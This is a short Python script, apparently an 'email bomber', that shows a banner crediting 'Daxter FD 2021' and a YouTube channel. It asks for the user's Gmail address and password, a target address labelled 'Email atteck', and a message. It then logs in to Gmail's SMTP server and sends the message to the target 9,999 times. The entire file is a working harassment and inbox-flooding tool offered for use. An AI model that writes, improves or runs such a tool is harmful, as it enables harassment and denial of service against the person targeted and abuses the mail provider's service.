import smtplib

print(r"""  
 █████████  ██████████ ███████████
 ███░░░░░███░░███░░░░░█░█░░░███░░░█
░███    ░░░  ░███  █ ░ ░   ░███  ░ 
░░█████████  ░██████       ░███    
 ░░░░░░░░███ ░███░░█       ░███    
 ███    ░███ ░███ ░   █    ░███    
░░█████████  ██████████    █████   
 ░░░░░░░░░  ░░░░░░░░░░    ░░░░░    
                                                                                                               """)
print("\n****************************************************************")
print("\n* credit & Daxter FD 2021                              *")
print("\n* YouTube :  https://www.youtube.com/channel/UChIC1-2UU5y6O_ycKVUwbqw                              *")
print("\n****************************************************************")

send_email = input(str("Please enter EmailYou:"))
rec_email = input(str("Pleasr Email atteck:"))
password = input(str("Please enter your paaword:"))
message = input(str("Please Message Confrom :" ))

for i in range(9999):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login (send_email,password)
    print("Login Succes")
    server.sendmail(send_email,rec_email,message)
    print("send Email Succes ","Rount",i+1,rec_email,'!!!!')